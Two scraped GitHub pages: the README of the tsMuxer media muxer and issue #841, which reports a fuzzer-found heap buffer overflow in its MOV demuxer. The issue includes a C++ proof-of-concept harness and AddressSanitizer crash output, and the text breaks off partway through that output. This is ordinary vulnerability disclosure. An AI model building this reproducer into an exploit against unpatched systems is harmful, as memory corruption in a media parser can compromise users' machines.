=== Content from github.com_69d0912b_20250115_114657.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjustdan96%2FtsMuxer)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjustdan96%2FtsMuxer)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=justdan96%2FtsMuxer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[justdan96](/justdan96)
/
**[tsMuxer](/justdan96/tsMuxer)**
Public

* [Notifications](/login?return_to=%2Fjustdan96%2FtsMuxer) You must be signed in to change notification settings
* [Fork
  148](/login?return_to=%2Fjustdan96%2FtsMuxer)
* [Star
   903](/login?return_to=%2Fjustdan96%2FtsMuxer)

tsMuxer is a transport stream muxer for remuxing/muxing elementary streams, EVO/VOB/MPG, MKV/MKA, MP4/MOV, TS, M2TS to TS to M2TS. Supported video codecs H.264/AVC, H.265/HEVC, VC-1, MPEG2. Supported audio codecs AAC, AC3 / E-AC3(DD+), DTS/ DTS-HD.

### License

[Apache-2.0 license](/justdan96/tsMuxer/blob/master/LICENSE)

[903
stars](/justdan96/tsMuxer/stargazers) [148
forks](/justdan96/tsMuxer/forks) [Branches](/justdan96/tsMuxer/branches) [Tags](/justdan96/tsMuxer/tags) [Activity](/justdan96/tsMuxer/activity)
 [Star](/login?return_to=%2Fjustdan96%2FtsMuxer)

 [Notifications](/login?return_to=%2Fjustdan96%2FtsMuxer) You must be signed in to change notification settings

* [Code](/justdan96/tsMuxer)
* [Issues
  111](/justdan96/tsMuxer/issues)
* [Pull requests
  4](/justdan96/tsMuxer/pulls)
* [Discussions](/justdan96/tsMuxer/discussions)
* [Actions](/justdan96/tsMuxer/actions)
* [Projects
  0](/justdan96/tsMuxer/projects)
* [Security](/justdan96/tsMuxer/security)
* [Insights](/justdan96/tsMuxer/pulse)

Additional navigation options

* [Code](/justdan96/tsMuxer)
* [Issues](/justdan96/tsMuxer/issues)
* [Pull requests](/justdan96/tsMuxer/pulls)
* [Discussions](/justdan96/tsMuxer/discussions)
* [Actions](/justdan96/tsMuxer/actions)
* [Projects](/justdan96/tsMuxer/projects)
* [Security](/justdan96/tsMuxer/security)
* [Insights](/justdan96/tsMuxer/pulse)

# justdan96/tsMuxer

    master[Branches](/justdan96/tsMuxer/branches)[Tags](/justdan96/tsMuxer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1,171 Commits](/justdan96/tsMuxer/commits/master/) | | |
| [.github/workflows](/justdan96/tsMuxer/tree/master/.github/workflows "This path skips through empty directories") | | [.github/workflows](/justdan96/tsMuxer/tree/master/.github/workflows "This path skips through empty directories") |  |  |
| [bin](/justdan96/tsMuxer/tree/master/bin "bin") | | [bin](/justdan96/tsMuxer/tree/master/bin "bin") |  |  |
| [docs](/justdan96/tsMuxer/tree/master/docs "docs") | | [docs](/justdan96/tsMuxer/tree/master/docs "docs") |  |  |
| [libmediation](/justdan96/tsMuxer/tree/master/libmediation "libmediation") | | [libmediation](/justdan96/tsMuxer/tree/master/libmediation "libmediation") |  |  |
| [scripts](/justdan96/tsMuxer/tree/master/scripts "scripts") | | [scripts](/justdan96/tsMuxer/tree/master/scripts "scripts") |  |  |
| [tsMuxer](/justdan96/tsMuxer/tree/master/tsMuxer "tsMuxer") | | [tsMuxer](/justdan96/tsMuxer/tree/master/tsMuxer "tsMuxer") |  |  |
| [tsMuxerGUI](/justdan96/tsMuxer/tree/master/tsMuxerGUI "tsMuxerGUI") | | [tsMuxerGUI](/justdan96/tsMuxer/tree/master/tsMuxerGUI "tsMuxerGUI") |  |  |
| [.clang-format](/justdan96/tsMuxer/blob/master/.clang-format ".clang-format") | | [.clang-format](/justdan96/tsMuxer/blob/master/.clang-format ".clang-format") |  |  |
| [.gitignore](/justdan96/tsMuxer/blob/master/.gitignore ".gitignore") | | [.gitignore](/justdan96/tsMuxer/blob/master/.gitignore ".gitignore") |  |  |
| [CHANGELOG.md](/justdan96/tsMuxer/blob/master/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/justdan96/tsMuxer/blob/master/CHANGELOG.md "CHANGELOG.md") |  |  |
| [CMakeLists.txt](/justdan96/tsMuxer/blob/master/CMakeLists.txt "CMakeLists.txt") | | [CMakeLists.txt](/justdan96/tsMuxer/blob/master/CMakeLists.txt "CMakeLists.txt") |  |  |
| [LICENSE](/justdan96/tsMuxer/blob/master/LICENSE "LICENSE") | | [LICENSE](/justdan96/tsMuxer/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/justdan96/tsMuxer/blob/master/README.md "README.md") | | [README.md](/justdan96/tsMuxer/blob/master/README.md "README.md") |  |  |
| [\_config.yml](/justdan96/tsMuxer/blob/master/_config.yml "_config.yml") | | [\_config.yml](/justdan96/tsMuxer/blob/master/_config.yml "_config.yml") |  |  |
| View all files | | |

## Repository files navigation

* README
* Apache-2.0 license
# tsMuxer

## Vision

This project is for tsMuxer - a transport stream muxer for remuxing/muxing elementary streams. This is very useful for transcoding and this project is used in other products such as Universal Media Server.

EVO/VOB/MPG, MKV/MKA, MP4/MOV, TS, M2TS to TS to M2TS.

Supported video codecs H.264/AVC, H.265/HEVC, H.266/VVC (Alpha release), VC-1, MPEG2.
Supported audio codecs AAC, AC3 / E-AC3(DD+), DTS/ DTS-HD - please note TrueHD must have the AC3 core intact.

Some of the major features include:

* Ability to set muxing fps manually and automatically
* Ability to change level for H.264 streams
* Ability to shift a sound tracks
* Ability to extract DTS core from DTS-HD
* Ability to join files
* Output/Author to compliant Blu-ray Disc or AVCHD
* Blu-ray 3D support

## Ethics

This project operates under the W3C's
[Code of Ethics and Professional Conduct](https://www.w3.org/Consortium/cepc):

> W3C is a growing and global community where participants choose to work
> together, and in that process experience differences in language, location,
> nationality, and experience. In such a diverse environment, misunderstandings
> and disagreements happen, which in most cases can be resolved informally. In
> rare cases, however, behavior can intimidate, harass, or otherwise disrupt one
> or more people in the community, which W3C will not tolerate.
>
> A Code of Ethics and Professional Conduct is useful to define accepted and
> acceptable behaviors and to promote high standards of professional
> practice. It also provides a benchmark for self evaluation and acts as a
> vehicle for better identity of the organization.

We hope that our community group act according to these guidelines, and that
participants hold each other to these high standards. If you have any questions
or are worried that the code isn't being followed, please contact the owner of the repository.

## Language

tsMuxer is written in C++. It can be compiled for Windows, Linux and Mac.

## History

This project was created by Roman Vasilenko, with the last public release 20th January 2014. It was open sourced on 23rd July 2019, to aid the future development.

## Installation

Please see [INSTALLATION.md](/justdan96/tsMuxer/blob/master/docs/INSTALLATION.md) for installation instructions.

## Usage

Please see [USAGE.md](/justdan96/tsMuxer/blob/master/docs/USAGE.md) for usage instructions.

## Todo

The following is a list of changes that will need to be made to the original source code and project in general:

* the program doesn't support MPEG-4 ASP, even though MPEG-4 ASP is defined in the TS specification
* no Opus audio support
* has issues with 24-bit DTS Express
* issues with the 3D plane lists when there are mismatches between the MPLS and M2TS

## Contributing

We’re really happy to accept contributions from the community, that’s the main reason why we open-sourced it! There are many ways to contribute, even if you’re not a technical person.

We’re using the infamous [simplified Github workflow](http://scottchacon.com/2011/08/31/github-flow.html) to accept modifications (even internally), basically you’ll have to:

* create an issue related to the problem you want to fix (good for traceability and cross-reference)
* fork the repository
* create a branch (optionally with the reference to the issue in the name)
* hack hack hack
* commit incrementally with readable and detailed commit messages
* submit a pull-request against the master branch of this repository

We’ll take care of tagging your issue with the appropriated labels and answer within a week (hopefully less!) to the problem you encounter.

If you’re not familiar with open-source workflows or our set of technologies, do not hesitate to ask for help! We can mentor you or propose good first bugs (as labeled in our issues). Also welcome to add your name to Credits section of this document.

All pull requests must pass code style checks which are executed with `clang-format` version 9. Therefore, it is advised to install an appropriate commit hook (for example [this one](https://github.com/barisione/clang-format-hooks)) to your local repository in order to commit properly formatted code right away.

## Submitting Bugs

You can report issues directly on Github, that would be a really useful contribution given that we lack some user testing on the project. Please document as much as possible the steps to reproduce your problem (even better with screenshots).

## Building

For full details on building tsMuxer for your platform please see the document on [COMPILING](/justdan96/tsMuxer/blob/master/docs/COMPILING.md).

## Testing

The very rough and incomplete testing document is available at [TESTING.md](/justdan96/tsMuxer/blob/master/docs/TESTING.md).

## Financing

We are not currently accepting any kind of donations and we do not have a bounty program.

### Sponsorships

The project is part of the [MacStadium Open Source Program](https://www.macstadium.com/opensource) to create native Apple Silicon executables for Mac OS.

[![MacStadiumOpenSource](https://camo.githubusercontent.com/f2a9dfbe3110090d61769bf559b6b6f1163138fbcc4c853628a43fe1610611ad/68747470733a2f2f75706c6f6164732d73736c2e776562666c6f772e636f6d2f3561633363303436633832373234393730666336303931382f3563303139643931376262613331326166373535336234395f4d61635374616469756d2d646576656c6f7065726c6f676f2e706e67)](https://camo.githubusercontent.com/f2a9dfbe3110090d61769bf559b6b6f1163138fbcc4c853628a43fe1610611ad/68747470733a2f2f75706c6f6164732d73736c2e776562666c6f772e636f6d2f3561633363303436633832373234393730666336303931382f3563303139643931376262613331326166373535336234395f4d61635374616469756d2d646576656c6f7065726c6f676f2e706e67)

## Versioning

Version numbering follows the [Semantic versioning](http://semver.org/) approach.

## License

We’re using the Apache 2.0 license for simplicity and flexibility. You are free to use it in your own project.

## Credits

**Original Author**
Roman Vasilenko (physic)

**Contributors**

* Daniel Bryant (justdan96)
* Daniel Kozar (xavery)
* Jean Christophe De Ryck (jcdr428)
* Stephen Hutchinson (qyot27)
* Koka Abakum (abakum)
* Alexey Shidlovsky (alexls74)
* Lonely Crane (lonecrane)
* Markus Feist (markusfeist)

For sake of brevity I am including anyone who has merged a pull request!

## About

tsMuxer is a transport stream muxer for remuxing/muxing elementary streams, EVO/VOB/MPG, MKV/MKA, MP4/MOV, TS, M2TS to TS to M2TS. Supported video codecs H.264/AVC, H.265/HEVC, VC-1, MPEG2. Supported audio codecs AAC, AC3 / E-AC3(DD+), DTS/ DTS-HD.

### Resources

[Readme](#readme-ov-file)
### License

[Apache-2.0 license](#Apache-2.0-1-ov-file)

[Activity](/justdan96/tsMuxer/activity)
### Stars

[**903**
stars](/justdan96/tsMuxer/stargazers)
### Watchers

[**37**
watching](/justdan96/tsMuxer/watchers)
### Forks

[**148**
forks](/justdan96/tsMuxer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fjustdan96%2FtsMuxer&report=justdan96+%28user%29)

## [Releases](/justdan96/tsMuxer/releases)

[286
tags](/justdan96/tsMuxer/tags)

## [Packages 0](/users/justdan96/packages?repo_name=tsMuxer)

No packages published

## [Contributors 27](/justdan96/tsMuxer/graphs/contributors)

[+ 13 contributors](/justdan96/tsMuxer/graphs/contributors)

## Languages

* [C++
  92.8%](/justdan96/tsMuxer/search?l=c%2B%2B)
* [HTML
  4.7%](/justdan96/tsMuxer/search?l=html)
* [C
  1.1%](/justdan96/tsMuxer/search?l=c)
* [Shell
  0.8%](/justdan96/tsMuxer/search?l=shell)
* [CMake
  0.5%](/justdan96/tsMuxer/search?l=cmake)
* [QMake
  0.1%](/justdan96/tsMuxer/search?l=qmake)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_74c21efb_20250115_114656.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjustdan96%2FtsMuxer%2Fissues%2F841)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjustdan96%2FtsMuxer%2Fissues%2F841)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=justdan96%2FtsMuxer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[justdan96](/justdan96)
/
**[tsMuxer](/justdan96/tsMuxer)**
Public

* [Notifications](/login?return_to=%2Fjustdan96%2FtsMuxer) You must be signed in to change notification settings
* [Fork
  148](/login?return_to=%2Fjustdan96%2FtsMuxer)
* [Star
   903](/login?return_to=%2Fjustdan96%2FtsMuxer)

* [Code](/justdan96/tsMuxer)
* [Issues
  111](/justdan96/tsMuxer/issues)
* [Pull requests
  4](/justdan96/tsMuxer/pulls)
* [Discussions](/justdan96/tsMuxer/discussions)
* [Actions](/justdan96/tsMuxer/actions)
* [Projects
  0](/justdan96/tsMuxer/projects)
* [Security](/justdan96/tsMuxer/security)
* [Insights](/justdan96/tsMuxer/pulse)

Additional navigation options

* [Code](/justdan96/tsMuxer)
* [Issues](/justdan96/tsMuxer/issues)
* [Pull requests](/justdan96/tsMuxer/pulls)
* [Discussions](/justdan96/tsMuxer/discussions)
* [Actions](/justdan96/tsMuxer/actions)
* [Projects](/justdan96/tsMuxer/projects)
* [Security](/justdan96/tsMuxer/security)
* [Insights](/justdan96/tsMuxer/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fjustdan96%2FtsMuxer%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fjustdan96%2FtsMuxer%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# heap buffer overflow is found in movDemuxer::mov\_read\_trun #841

Closed

[iwashiira](/iwashiira) opened this issue
Mar 13, 2024
· 3 comments
 · Fixed by [#851](https://github.com/justdan96/tsMuxer/pull/851)

Closed

# [heap buffer overflow is found in movDemuxer::mov\_read\_trun](#top) #841

[iwashiira](/iwashiira) opened this issue
Mar 13, 2024
· 3 comments
 · Fixed by [#851](https://github.com/justdan96/tsMuxer/pull/851)

## Comments

[![@iwashiira](https://avatars.githubusercontent.com/u/89283357?s=80&u=6e0b6aa62f0ecb9bcd58895605b3c60ac934dea1&v=4)](/iwashiira)

Copy link

Contributor

### **[iwashiira](/iwashiira)** commented [Mar 13, 2024](#issue-2183853585) • edited Loading

| Our fuzzer found heap buffer overflow in movDemuxer. in the current master([75c9cb3](https://github.com/justdan96/tsMuxer/commit/75c9cb3514815d07378007d36cc90c3f209e7b36)). PoC is here.  ``` #include "bufferedReaderManager.h" #include "vod_common.h" #include "abstractDemuxer.h" #include "movDemuxer.h" #include <cstdint> #include <fs/systemlog.h>  using namespace std;  BufferedReaderManager readManager(2, DEFAULT_FILE_BLOCK_SIZE, DEFAULT_FILE_BLOCK_SIZE + MAX_AV_PACKET_SIZE,                                   DEFAULT_FILE_BLOCK_SIZE / 2);  int main(int argc, char* argv[]) {      string fileName = argv[1];     AbstractDemuxer* demuxer = new MovDemuxer(readManager);      uint32_t fileBlockSize = demuxer->getFileBlockSize();     demuxer->openFile(fileName);     return 0; } ```  Following is an output of ASAN. vuln15.mov is in [poc15.zip](https://github.com/justdan96/tsMuxer/files/14586713/poc15.zip)  ``` ================================================================= ==29495==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x615000000f00 at pc 0x55555596c667 bp 0x7fffffffd1e0 sp 0x7fffffffd1d0 WRITE of size 4 at 0x615000000f00 thread T0     #0 0x55555596c666 in MovDemuxer::mov_read_trun(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x418666)     #1 0x55555596a81b in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41681b)     #2 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #3 0x55555596a4a3 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4164a3)     #4 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #5 0x55555596ee65 in MovDemuxer::mov_read_moof(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41ae65)     #6 0x55555596a615 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416615)     #7 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #8 0x555555967635 in MovDemuxer::readHeaders() (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x413635)     #9 0x55555596679a in MovDemuxer::openFile(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41279a)     #10 0x5555558b6e45 in main (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x362e45)     #11 0x7ffff6f70d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58     #12 0x7ffff6f70e3f in __libc_start_main_impl ../csu/libc-start.c:392     #13 0x5555557cc0d4 in _start (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x2780d4)  0x615000000f00 is located 0 bytes to the right of 512-byte region [0x615000000d00,0x615000000f00) allocated by thread T0 here:     #0 0x7ffff767a1e7 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:99     #1 0x55555599271f in __gnu_cxx::new_allocator<MOVStts>::allocate(unsigned long, void const*) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x43e71f)     #2 0x55555598eb9a in std::allocator_traits<std::allocator<MOVStts> >::allocate(std::allocator<MOVStts>&, unsigned long) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x43ab9a)     #3 0x55555598a67f in std::_Vector_base<MOVStts, std::allocator<MOVStts> >::_M_allocate(unsigned long) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x43667f)     #4 0x555555984c59 in void std::vector<MOVStts, std::allocator<MOVStts> >::_M_realloc_insert<>(__gnu_cxx::__normal_iterator<MOVStts*, std::vector<MOVStts, std::allocator<MOVStts> > >) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x430c59)     #5 0x55555597f506 in MOVStts& std::vector<MOVStts, std::allocator<MOVStts> >::emplace_back<>() (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x42b506)     #6 0x55555596c5d4 in MovDemuxer::mov_read_trun(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4185d4)     #7 0x55555596a81b in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41681b)     #8 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #9 0x55555596a4a3 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4164a3)     #10 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #11 0x55555596ee65 in MovDemuxer::mov_read_moof(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41ae65)     #12 0x55555596a615 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416615)     #13 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #14 0x5555559704fd in MovDemuxer::mov_read_stsd(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41c4fd)     #15 0x55555596a6ce in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4166ce)     #16 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #17 0x55555596a4a3 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4164a3)     #18 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #19 0x55555596a4a3 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4164a3)     #20 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #21 0x55555596a4a3 in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4164a3)     #22 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #23 0x55555596d034 in MovDemuxer::mov_read_trak(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x419034)     #24 0x55555596a7ac in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x4167ac)     #25 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #26 0x55555596ebf3 in MovDemuxer::mov_read_moov(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41abf3)     #27 0x55555596a63a in MovDemuxer::ParseTableEntry(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x41663a)     #28 0x55555596aefb in MovDemuxer::mov_read_default(MovDemuxer::MOVAtom) (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x416efb)     #29 0x555555967635 in MovDemuxer::readHeaders() (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x413635)  SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/vagrant/tsmuxer/for-build/build/tsMuxer/tsmuxer+0x418666) in MovDemuxer::mov_read_trun(MovDemuxer::MOVAtom) Shadow bytes around the buggy address:   0x0c2a7fff8190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c2a7fff81a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c2a7fff81b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c2a7fff81c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x0c2a7fff81d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c2a7fff81e0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c2a7fff81f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c2a7fff8200: fa fa fa fa 